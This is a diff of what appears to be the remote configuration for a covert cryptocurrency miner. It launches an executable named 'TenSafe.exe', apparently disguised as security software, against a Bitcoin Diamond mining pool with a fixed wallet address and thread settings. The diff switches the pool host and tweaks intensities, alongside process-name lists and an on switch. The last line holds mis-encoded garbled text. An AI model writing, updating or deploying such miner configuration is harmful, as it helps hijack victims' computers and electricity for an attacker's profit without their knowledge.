@@ -379,15 +379,15 @@ Y3X--MMMMMMM.EXE--Y3X
 Y4X--MMMMMMM.EXE--Y4X
 Y5X--MMMMMMM.EXE--Y5X
 ------------------------------------------------------------------------------------------------------------------------------------
-A1A--\TenSafe.exe -o stratum+tcp://bcd.uupool.cn:6001 -a bcd -u 17PC5JE4FK4D4Bkh33u5vi3HJWeU14uLCZ.12 -i 12 -p x--A1A
-A2A--\TenSafe.exe -o stratum+tcp://bcd.uupool.cn:6001 -a bcd -u 17PC5JE4FK4D4Bkh33u5vi3HJWeU14uLCZ.12 -i 14 -p x--A2A
-A3A--\TenSafe.exe -o stratum+tcp://bcd.uupool.cn:6001 -a bcd -u 17PC5JE4FK4D4Bkh33u5vi3HJWeU14uLCZ.12 -i 14 -p x--A3A
-A4A--\TenSafe.exe -o stratum+tcp://bcd.uupool.cn:6001 -a bcd -u 17PC5JE4FK4D4Bkh33u5vi3HJWeU14uLCZ.12 -i 12 -p x--A4A
-A5A--\TenSafe.exe -o stratum+tcp://bcd.uupool.cn:6001 -a bcd -u 17PC5JE4FK4D4Bkh33u5vi3HJWeU14uLCZ.12 -i 14 -p x--A5A
-A6A--\TenSafe.exe -o stratum+tcp://bcd.uupool.cn:6001 -a bcd -u 17PC5JE4FK4D4Bkh33u5vi3HJWeU14uLCZ.12 -i 14 -p x--A6A
-A7A--\TenSafe.exe -o stratum+tcp://bcd.uupool.cn:6001 -a bcd -u 17PC5JE4FK4D4Bkh33u5vi3HJWeU14uLCZ.12 -i 12 -p x--A7A
+A1A--\TenSafe.exe -o stratum+tcp://bcd.f2pool.com:5610 -a bcd -u 17PC5JE4FK4D4Bkh33u5vi3HJWeU14uLCZ.12 -i 13 -p x--A1A
+A2A--\TenSafe.exe -o stratum+tcp://bcd.f2pool.com:5610 -a bcd -u 17PC5JE4FK4D4Bkh33u5vi3HJWeU14uLCZ.12 -i 15 -p x--A2A
+A3A--\TenSafe.exe -o stratum+tcp://bcd.f2pool.com:5610 -a bcd -u 17PC5JE4FK4D4Bkh33u5vi3HJWeU14uLCZ.12 -i 15 -p x--A3A
+A4A--\TenSafe.exe -o stratum+tcp://bcd.f2pool.com:5610 -a bcd -u 17PC5JE4FK4D4Bkh33u5vi3HJWeU14uLCZ.12 -i 13 -p x--A4A
+A5A--\TenSafe.exe -o stratum+tcp://bcd.f2pool.com:5610 -a bcd -u 17PC5JE4FK4D4Bkh33u5vi3HJWeU14uLCZ.12 -i 15 -p x--A5A
+A6A--\TenSafe.exe -o stratum+tcp://bcd.f2pool.com:5610 -a bcd -u 17PC5JE4FK4D4Bkh33u5vi3HJWeU14uLCZ.12 -i 15 -p x--A6A
+A7A--\TenSafe.exe -o stratum+tcp://bcd.f2pool.com:5610 -a bcd -u 17PC5JE4FK4D4Bkh33u5vi3HJWeU14uLCZ.12 -i 12 -p x--A7A
 A9A--ON--A9A
 ------------------------------------------------------------------------------------------------------------------------------------
 A0A--\TenSafe.exe--A0A
-A8A--TenS1afe.exe--A8A---×ÔÉí
+A8A--TenS1afe.exe--A8A---Ã—Ã”Ã‰Ã­
 --------------------------------------------------------------------------------------------------------------------------------------
